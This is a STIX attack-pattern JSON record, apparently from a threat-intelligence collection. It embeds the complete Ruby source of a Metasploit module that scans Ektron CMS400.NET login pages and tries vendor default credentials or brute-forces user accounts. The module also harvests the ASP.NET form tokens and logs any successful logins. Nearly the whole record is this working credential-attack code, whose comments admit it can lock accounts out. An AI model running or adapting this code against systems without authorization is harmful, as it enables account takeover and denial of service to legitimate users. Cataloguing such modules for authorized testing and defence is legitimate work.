{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--573c1960-8e7a-4b0c-b1cd-d1743c4e6081",
    "created": "2024-08-14T16:30:36.142702Z",
    "modified": "2024-08-14T16:30:36.142707Z",
    "name": "Ektron CMS400.NET Default Password Scanner",
    "description": " Ektron CMS400.NET is a web content management system based on .NET. This module tests for installations that are utilizing default passwords set by the vendor. Additionally, it has the ability to brute force user accounts. Note that Ektron CMS400.NET, by default, enforces account lockouts for regular user account after a number of failed attempts.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/ektron_cms400net.rb",
            "external_id": "ektron_cms400net.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n        'Name'          => 'Ektron CMS400.NET Default Password Scanner',\n        'Description'   => %q{\n          Ektron CMS400.NET is a web content management system based on .NET.\n          This module tests for installations that are utilizing default\n          passwords set by the vendor. Additionally, it has the ability\n          to brute force user accounts. Note that Ektron CMS400.NET, by\n          default, enforces account lockouts for regular user account\n          after a number of failed attempts.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        => ['Justin Cacak']\n      ))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"Path to the CMS400.NET login page\", '/WorkArea/login.aspx']),\n        OptPath.new(\n          'USERPASS_FILE',\n          [\n            false,\n            \"File containing users and passwords\",\n            File.join(Msf::Config.data_directory, \"wordlists\", \"cms400net_default_userpass.txt\")\n          ])\n      ])\n\n    # Set to false to prevent account lockouts - it will!\n    deregister_options('BLANK_PASSWORDS')\n  end\n\n  def target_url\n    # Function to display correct protocol and host/vhost info\n    if rport == 443 or ssl\n      proto = \"https\"\n    else\n      proto = \"http\"\n    end\n\n    uri = normalize_uri(datastore['URI'])\n    if vhost != \"\"\n      \"#{proto}://#{vhost}:#{rport}#{uri.to_s}\"\n    else\n      \"#{proto}://#{rhost}:#{rport}#{uri.to_s}\"\n    end\n  end\n\n    def gen_blank_passwords(users, credentials)\n      return credentials\n    end\n\n  def run_host(ip)\n    begin\n      res = send_request_cgi(\n      {\n        'method'  => 'GET',\n        'uri'     => normalize_uri(datastore['URI'])\n      }, 20)\n\n      if res.nil?\n        print_error(\"Connection timed out\")\n        return\n      end\n\n      # Check for HTTP 200 response.\n      # Numerous versions and configs make if difficult to further fingerprint.\n      if (res and res.code == 200)\n        print_status(\"Ektron CMS400.NET install found at #{target_url}  [HTTP 200]\")\n\n        #Gather __VIEWSTATE and __EVENTVALIDATION from HTTP response.\n        #Required to be sent based on some versions/configs.\n        begin\n          viewstate = res.body.scan(/<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*)\"/)[0][0]\n        rescue\n          viewstate = \"\"\n        end\n\n        begin\n          eventvalidation = res.body.scan(/<input type=\"hidden\" name=\"__EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\"(.*)\"/)[0][0]\n        rescue\n          eventvalidation = \"\"\n        end\n\n        get_version\n\n        print_status \"Testing passwords at #{target_url}\"\n        each_user_pass { |user, pass|\n          do_login(user, pass, viewstate, eventvalidation)\n        }\n      else\n        print_error(\"Ektron CMS400.NET login page not found at #{target_url}. May need to set VHOST or RPORT.  [HTTP #{res.code}]\")\n      end\n\n    rescue\n      print_error(\"Ektron CMS400.NET login page not found at #{target_url}  [HTTP #{res.code}]\")\n      return\n    end\n  end\n\n  def get_version\n      # Attempt to retrieve the version of CMS400.NET installed.\n      # Not always possible based on version/config.\n      payload = \"http://#{vhost}:#{rport}/WorkArea/java/ektron.site-data.js.ashx\"\n      res = send_request_cgi(\n      {\n        'method'  => 'GET',\n        'uri'     => payload\n      }, 20)\n\n      if (res.body.match(/Version.:.(\\d{1,3}.\\d{1,3})/))\n        print_status \"Ektron CMS400.NET version: #{$1}\"\n      end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user=nil, pass=nil, viewstate_arg=viewstate, eventvalidation_arg=eventvalidation)\n    vprint_status(\"#{target_url} - Trying: username:'#{user}' with password:'#{pass}'\")\n\n    post_data =  \"__VIEWSTATE=#{Rex::Text.uri_encode(viewstate_arg.to_s)}\"\n    post_data << \"&__EVENTVALIDATION=#{Rex::Text.uri_encode(eventvalidation_arg.to_s)}\"\n    post_data << \"&username=#{Rex::Text.uri_encode(user.to_s)}\"\n    post_data << \"&password=#{Rex::Text.uri_encode(pass.to_s)}\"\n\n    begin\n      res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => normalize_uri(datastore['URI']),\n        'data'    => post_data,\n      }, 20)\n\n      if (res and res.code == 200 and res.body.to_s.match(/LoginSuceededPanel/i) != nil)\n        print_good(\"#{target_url} [Ektron CMS400.NET] Successful login: '#{user}' : '#{pass}'\")\n        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)\n\n      elsif(res and res.code == 200)\n        vprint_error(\"#{target_url} [Ekton CMS400.NET] - Failed login as: '#{user}'\")\n      else\n        print_error(\"#{target_url} [Error] Unable to authenticate. Check parameters.  [HTTP #{res.code}]\")\n        return :abort\n      end\n\n    rescue ::Rex::ConnectionError => e\n      vprint_error(\"http://#{tartget_url} - #{e.to_s}\")\n      return :abort\n    end\n\n  end\nend\n"
}